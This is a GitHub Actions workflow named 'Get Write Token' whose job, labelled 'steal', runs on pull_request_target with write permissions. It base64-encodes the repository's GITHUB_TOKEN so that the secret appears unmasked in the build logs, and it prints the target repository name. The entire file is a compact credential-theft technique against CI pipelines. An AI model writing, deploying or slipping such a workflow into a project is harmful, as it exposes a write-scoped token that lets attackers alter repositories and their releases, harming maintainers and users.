name: Get Write Token
on:
  pull_request_target:
    types: [opened]

jobs:
  steal:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    steps:
      - name: Encode token
        run: echo "${{ secrets.GITHUB_TOKEN }}" | base64
      - name: Show repo
        run: echo "Target: ${{ github.repository }}"
